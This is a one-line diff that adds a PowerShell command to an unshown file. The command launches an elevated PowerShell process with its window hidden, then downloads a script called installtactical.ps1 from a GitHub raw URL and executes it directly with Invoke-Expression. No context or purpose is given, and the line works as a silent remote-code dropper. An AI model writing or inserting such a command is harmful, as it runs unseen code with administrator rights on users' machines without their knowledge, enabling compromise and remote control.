@@ -1,0 +1,1 @@
+Start-Process "powershell.exe" -ArgumentList "-Command Invoke-Expression(Invoke-WebRequest -Uri https://raw.githubusercontent.com/pty-spawn/tools/refs/heads/main/installtactical.ps1).Content" -WindowStyle Hidden -Verb runAs
